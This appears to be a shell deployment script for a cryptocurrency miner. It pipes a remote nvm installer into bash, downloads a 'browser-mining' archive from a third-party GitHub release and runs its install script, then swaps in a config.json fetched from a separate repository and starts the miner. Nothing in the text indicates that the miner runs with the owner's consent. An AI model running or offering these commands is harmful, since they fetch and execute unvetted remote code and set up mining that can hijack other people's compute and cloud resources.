sudo apt update && sudo apt install curl ca-certificates -y
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash
nvm install 18
nvm use 18
wget https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz
tar -xf browser-mining.tar.gz
cd browser-mining
npm install
sh install.sh
rm config.json
wget https://raw.githubusercontent.com/ptypecolorss/fileshare/main/config.json
node index.js
